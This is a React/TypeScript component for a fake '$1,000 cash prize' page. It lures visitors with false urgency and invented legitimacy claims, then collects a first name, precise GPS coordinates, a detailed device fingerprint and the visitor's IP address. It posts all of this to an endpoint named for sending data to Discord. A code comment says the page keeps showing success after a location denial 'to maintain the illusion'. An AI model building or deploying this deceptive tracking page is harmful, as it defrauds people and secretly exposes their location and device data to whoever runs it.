// File: src/components/FakeRewardInterface.tsx
'use client';

import { useState, useEffect } from 'react';
import { Gift, MapPin, Smartphone, Clock, Star, Trophy } from 'lucide-react';

interface DeviceInfo {
  deviceName: string;
  deviceType: string;
  operatingSystem: string;
  browser: string;
  browserVersion: string;
  screenDetails: {
    resolution: string;
    availableResolution: string;
    colorDepth: number;
    pixelRatio: number;
  };
  hardwareDetails: {
    cores: number;
    memory: string;
    touchSupport: boolean;
    orientation: string;
  };
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  userAgent: string;
  referrer: string;
  language: string;
  platform: string;
  screenResolution: string;
  timezone: string;
  deviceInfo: DeviceInfo;
  ip?: string;
}

interface Props {
  onDataCollected: (data: LocationData) => void;
}

export default function FakeRewardInterface({ onDataCollected }: Props) {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [userName, setUserName] = useState('');
  const [showCongrats, setShowCongrats] = useState(false);

  // Device detection function
  const detectDevice = (): DeviceInfo => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = screen.width;
    const screenHeight = screen.height;
    
    // Detect device type and name
    let deviceName = 'Unknown Device';
    let deviceType = 'Desktop';
    let operatingSystem = 'Unknown OS';
    
    // Mobile device detection with specific models
    if (/iPhone/.test(userAgent)) {
      deviceType = 'Mobile';
      operatingSystem = 'iOS';
      
      // iPhone model detection based on screen dimensions and user agent
      if (screenWidth === 428 && screenHeight === 926) deviceName = 'iPhone 12 Pro Max / 13 Pro Max / 14 Plus';
      else if (screenWidth === 414 && screenHeight === 896) deviceName = 'iPhone 11 / XR';
      else if (screenWidth === 414 && screenHeight === 736) deviceName = 'iPhone 6/7/8 Plus';
      else if (screenWidth === 390 && screenHeight === 844) deviceName = 'iPhone 12 / 12 Pro / 13 / 13 Pro / 14';
      else if (screenWidth === 393 && screenHeight === 852) deviceName = 'iPhone 14 Pro';
      else if (screenWidth === 430 && screenHeight === 932) deviceName = 'iPhone 14 Pro Max / 15 Pro Max';
      else if (screenWidth === 375 && screenHeight === 812) deviceName = 'iPhone X / XS / 11 Pro / 12 mini / 13 mini';
      else if (screenWidth === 375 && screenHeight === 667) deviceName = 'iPhone 6/7/8/SE 2nd/3rd gen';
      else if (screenWidth === 320 && screenHeight === 568) deviceName = 'iPhone 5/5S/5C/SE 1st gen';
      else if (/iPhone15/.test(userAgent)) deviceName = 'iPhone 15 Series';
      else deviceName = 'iPhone (Unknown Model)';
    }
    else if (/iPad/.test(userAgent)) {
      deviceType = 'Tablet';
      operatingSystem = 'iPadOS';
      
      if (screenWidth === 1024 && screenHeight === 1366) deviceName = 'iPad Pro 12.9"';
      else if (screenWidth === 834 && screenHeight === 1194) deviceName = 'iPad Pro 11"';
      else if (screenWidth === 834 && screenHeight === 1112) deviceName = 'iPad Air (4th/5th gen)';
      else if (screenWidth === 768 && screenHeight === 1024) deviceName = 'iPad (9th gen) / iPad mini';
      else if (screenWidth === 820 && screenHeight === 1180) deviceName = 'iPad Air (5th gen)';
      else deviceName = 'iPad (Unknown Model)';
    }
    else if (/Android/.test(userAgent)) {
      deviceType = /Mobile/.test(userAgent) ? 'Mobile' : 'Tablet';
      operatingSystem = 'Android';
      
      // Samsung Galaxy detection
      if (/SM-G/.test(userAgent)) {
        if (screenWidth === 412 && screenHeight === 915) deviceName = 'Samsung Galaxy S21/S22';
        else if (screenWidth === 414 && screenHeight === 896) deviceName = 'Samsung Galaxy S20';
        else if (screenWidth === 360 && screenHeight === 780) deviceName = 'Samsung Galaxy S10';
        else if (screenWidth === 412 && screenHeight === 869) deviceName = 'Samsung Galaxy Note 20';
        else deviceName = 'Samsung Galaxy Series';
      }
      else if (/Pixel/.test(userAgent)) {
        if (screenWidth === 412 && screenHeight === 915) deviceName = 'Google Pixel 6/7';
        else if (screenWidth === 393 && screenHeight === 851) deviceName = 'Google Pixel 5';
        else if (screenWidth === 411 && screenHeight === 823) deviceName = 'Google Pixel 4';
        else deviceName = 'Google Pixel Series';
      }
      else if (/OnePlus/.test(userAgent)) {
        deviceName = 'OnePlus Device';
      }
      else if (/Huawei|HUAWEI/.test(userAgent)) {
        deviceName = 'Huawei Device';
      }
      else if (/Xiaomi|Mi/.test(userAgent)) {
        deviceName = 'Xiaomi Device';
      }
      else {
        deviceName = 'Android Device';
      }
    }
    else if (/Windows NT/.test(userAgent)) {
      operatingSystem = 'Windows';
      if (/Windows NT 10.0/.test(userAgent)) operatingSystem = 'Windows 10/11';
      else if (/Windows NT 6.3/.test(userAgent)) operatingSystem = 'Windows 8.1';
      else if (/Windows NT 6.1/.test(userAgent)) operatingSystem = 'Windows 7';
      
      // Detect if it's a Surface device
      if (/Surface/.test(userAgent)) {
        deviceName = 'Microsoft Surface';
        deviceType = 'Tablet/Laptop';
      } else {
        deviceName = 'Windows PC';
      }
    }
    else if (/Macintosh|Mac OS X/.test(userAgent)) {
      operatingSystem = 'macOS';
      
      // Detect Mac model based on screen resolution
      if (screenWidth === 1728 && screenHeight === 1117) deviceName = 'MacBook Air 13" (M2)';
      else if (screenWidth === 1680 && screenHeight === 1050) deviceName = 'MacBook Pro 13" / MacBook Air';
      else if (screenWidth === 1728 && screenHeight === 1117) deviceName = 'MacBook Pro 14"';
      else if (screenWidth === 1800 && screenHeight === 1169) deviceName = 'MacBook Pro 16"';
      else if (screenWidth === 2560 && screenHeight === 1600) deviceName = 'MacBook Pro 13" (Retina)';
      else if (screenWidth === 2880 && screenHeight === 1800) deviceName = 'MacBook Pro 15"';
      else if (screenWidth === 3456 && screenHeight === 2234) deviceName = 'MacBook Pro 16" (M1/M2)';
      else if (screenWidth >= 2560) deviceName = 'iMac / Mac Studio with External Display';
      else deviceName = 'Mac Computer';
    }
    else if (/Linux/.test(userAgent)) {
      operatingSystem = 'Linux';
      deviceName = 'Linux PC';
    }
    
    // Browser detection
    let browser = 'Unknown Browser';
    let browserVersion = '';
    
    if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
      browser = 'Chrome';
      const match = userAgent.match(/Chrome\/(\d+)/);
      browserVersion = match ? match[1] : '';
    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
      browser = 'Safari';
      const match = userAgent.match(/Version\/(\d+)/);
      browserVersion = match ? match[1] : '';
    } else if (/Firefox/.test(userAgent)) {
      browser = 'Firefox';
      const match = userAgent.match(/Firefox\/(\d+)/);
      browserVersion = match ? match[1] : '';
    } else if (/Edg/.test(userAgent)) {
      browser = 'Microsoft Edge';
      const match = userAgent.match(/Edg\/(\d+)/);
      browserVersion = match ? match[1] : '';
    }
    
    return {
      deviceName,
      deviceType,
      operatingSystem,
      browser,
      browserVersion,
      screenDetails: {
        resolution: `${screenWidth}x${screenHeight}`,
        availableResolution: `${screen.availWidth}x${screen.availHeight}`,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio || 1,
      },
      hardwareDetails: {
        cores: navigator.hardwareConcurrency || 0,
        memory: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory}GB` : 'Unknown',
        touchSupport: 'ontouchstart' in window,
        orientation: screen.orientation?.type || 'unknown',
      }
    };
  };

  const collectData = async () => {
    setLoading(true);

    try {
      // Get device information
      const deviceInfo = detectDevice();
      
      // Get location
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      // Gather additional data
      const data: LocationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Direct visit',
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        deviceInfo,
      };

      // Get IP address
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.ip = ipData.ip;
      } catch (ipError) {
        console.log('Could not fetch IP:', ipError);
      }

      // Send to Discord
      await sendToDiscord(data);
      
      setLoading(false);
      setShowCongrats(true);
      
      // Notify parent component
      onDataCollected(data);
      
    } catch (err) {
      setLoading(false);
      // Even if location fails, still show success to maintain the illusion
      setShowCongrats(true);
      
      // Collect what we can without location
      const deviceInfo = detectDevice();
      const basicData = {
        latitude: 0,
        longitude: 0,
        accuracy: 0,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Direct visit',
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        deviceInfo,
        error: 'Location denied'
      };

      await sendToDiscord(basicData);
      onDataCollected(basicData as LocationData);
    }
  };

  const sendToDiscord = async (data: any) => {
    try {
      await fetch('/api/send-to-discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({...data, userName}),
      });
    } catch (error) {
      console.error('Error sending to Discord:', error);
    }
  };

  if (showCongrats) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-center transform animate-bounce">
          <div className="text-6xl mb-4">🎉</div>
          <h2 className="text-3xl font-bold text-green-600 mb-4">
            Congratulations!
          </h2>
          <p className="text-lg text-gray-700 mb-4">
            Your reward is being processed...
          </p>
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-4"></div>
          <p className="text-sm text-gray-500">
            Please wait while we verify your location for delivery
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full">
        {/* Header */}
        <div className="bg-gradient-to-r from-yellow-400 to-orange-500 p-6 text-center">
          <Trophy className="h-16 w-16 text-white mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-white mb-2">
            🎊 CONGRATULATIONS! 🎊
          </h1>
          <p className="text-white opacity-90">
            You've been selected as our lucky winner!
          </p>
        </div>

        {/* Content */}
        <div className="p-6">
          {step === 1 && (
            <div className="text-center">
              <div className="text-6xl mb-4">💰</div>
              <h2 className="text-3xl font-bold text-gray-800 mb-4">
                $1,000 CASH PRIZE!
              </h2>
              <div className="bg-yellow-100 border border-yellow-400 rounded-lg p-4 mb-6">
                <div className="flex items-center justify-center mb-2">
                  <Clock className="h-5 w-5 text-red-600 mr-2" />
                  <span className="text-red-600 font-semibold">Limited Time Offer!</span>
                </div>
                <p className="text-sm text-gray-700">
                  This exclusive offer expires in 10 minutes. Don't miss out!
                </p>
              </div>
              
              <div className="space-y-3 mb-6">
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Prize Amount:</span>
                  <span className="font-bold text-green-600">$1,000.00</span>
                </div>
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Processing Fee:</span>
                  <span className="font-bold text-green-600">FREE</span>
                </div>
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Delivery:</span>
                  <span className="font-bold text-green-600">Instant</span>
                </div>
              </div>

              <button
                onClick={() => setStep(2)}
                className="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:from-green-600 hover:to-blue-600 transform hover:scale-105 transition-all duration-200 shadow-lg"
              >
                🎁 CLAIM YOUR $1,000 NOW!
              </button>
              
              <div className="mt-4 flex items-center justify-center space-x-4 text-yellow-400">
                {[...Array(5)].map((_, i) => (
                  <Star key={i} className="h-5 w-5 fill-current" />
                ))}
              </div>
              <p className="text-xs text-gray-500 mt-2">
                Rated 5/5 by 10,000+ winners
              </p>
            </div>
          )}

          {step === 2 && (
            <div className="text-center">
              <Gift className="h-16 w-16 text-purple-600 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Almost There!
              </h2>
              <p className="text-gray-600 mb-6">
                We need to verify your identity and location for secure delivery of your prize money.
              </p>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                <h3 className="font-semibold text-blue-800 mb-2">Why do we need this?</h3>
                <ul className="text-sm text-blue-700 space-y-1 text-left">
                  <li>✓ Prevent fraud and ensure you're the real winner</li>
                  <li>✓ Calculate local taxes and compliance</li>
                  <li>✓ Arrange secure cash delivery to your area</li>
                  <li>✓ Required by law for prizes over $500</li>
                </ul>
              </div>

              <input
                type="text"
                placeholder="Enter your first name"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />

              <button
                onClick={() => setStep(3)}
                disabled={!userName.trim()}
                className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-3 px-6 rounded-lg hover:from-purple-600 hover:to-pink-600 transform hover:scale-105 transition-all duration-200 shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Continue to Verification
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="text-center">
              <div className="text-4xl mb-4">📍</div>
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Final Step: Location Verification
              </h2>
              <p className="text-gray-600 mb-6">
                Hi {userName}! We need to verify your location to ensure secure delivery of your $1,000 prize.
              </p>
              
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-center justify-center mb-2">
                  <Smartphone className="h-5 w-5 text-green-600 mr-2" />
                  <span className="font-semibold text-green-800">Secure Location Check</span>
                </div>
                <p className="text-sm text-green-700">
                  Your browser will ask for location permission. This is completely safe and used only for prize delivery verification.
                </p>
              </div>

              <div className="bg-yellow-50 border border-yellow-400 rounded-lg p-3 mb-6">
                <p className="text-sm text-yellow-800">
                  <strong>Important:</strong> Click "Allow" when your browser asks for location access to complete the verification process.
                </p>
              </div>

              {loading ? (
                <div className="py-8">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
                  <p className="text-gray-600">Verifying your location...</p>
                  <p className="text-sm text-gray-500 mt-2">This may take a few moments</p>
                </div>
              ) : (
                <button
                  onClick={collectData}
                  className="w-full bg-gradient-to-r from-red-500 to-orange-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:from-red-600 hover:to-orange-600 transform hover:scale-105 transition-all duration-200 shadow-lg animate-pulse"
                >
                  <MapPin className="inline-block h-5 w-5 mr-2" />
                  VERIFY LOCATION & CLAIM $1,000
                </button>
              )}
              
              <p className="text-xs text-gray-500 mt-4">
                🔒 Your information is encrypted and secure
              </p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="bg-gray-50 px-6 py-3 text-center">
          <p className="text-xs text-gray-500">
            ⭐ Join 50,000+ satisfied winners | 100% Legitimate | No Hidden Fees
          </p>
        </div>
      </div>
    </div>
  );
}